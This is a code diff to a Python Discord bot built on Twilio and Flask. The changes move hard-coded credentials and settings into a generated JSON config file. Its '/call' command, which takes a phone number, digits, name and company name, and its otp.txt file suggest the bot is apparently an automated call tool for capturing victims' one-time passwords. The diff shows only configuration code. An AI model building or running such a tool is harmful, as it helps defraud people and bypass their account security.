@@ -6,19 +6,10 @@ from flask import Flask, request
 from twilio.rest import Client
 import time
 import os
+import json
 
-client_discord = commands.Bot(command_prefix='=')
-slash = SlashCommand(client_discord, sync_commands=True)
-guild = discord.Guild
-account_sid = 'Your Twilio Acc SID'#
-auth_token = 'Your Twilio Acc Auth Token'#
-your_twilio_phone_number = '+1234567890'#
-ngrok = 'https://example.ngrok.io Your Ngrok URL'#
-client = Client(account_sid, auth_token)
-server_id = 953877934937096232 #Your ServerID
-
-app = Flask(__name__)
-
+if not 'Config.txt' in os.listdir():
+    open('Config.txt', 'w').write('{"account_sid":"", "auth_token":"", "Twilio Phone Number":"+123456789", "ngrok_url":"https://example.ngrok.io", "server_id":"", "bot_token":""}')
 if not 'status.txt' in os.listdir():
     open('status.txt',  'w').close()
 if not 'otp.txt' in os.listdir():
@@ -31,6 +22,21 @@ if not 'Digits.txt' in os.listdir('Extra'):
     open('Extra/Digits.txt', 'w').close()
 if not 'Name.txt' in os.listdir('Extra'):
     open('Extra/Name.txt', 'w').close()
+
+raw_config = json.loads(open('Config.txt', 'r').read())
+
+client_discord = commands.Bot(command_prefix='=')
+slash = SlashCommand(client_discord, sync_commands=True)
+guild = discord.Guild
+account_sid = raw_config['account_sid']
+auth_token = raw_config['auth_token']
+your_twilio_phone_number = raw_config['Twilio Phone Number']
+ngrok = raw_config['ngrok_url']
+client = Client(account_sid, auth_token)
+server_id = int(raw_config['server_id'])
+
+app = Flask(__name__)
+
 
 @slash.slash(
     name='call',
@@ -256,5 +262,5 @@ async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=s
     open('status.txt', 'w').close()
 
 client_discord.run(
-    '' #Your Token
+    raw_config['bot_token']
 )
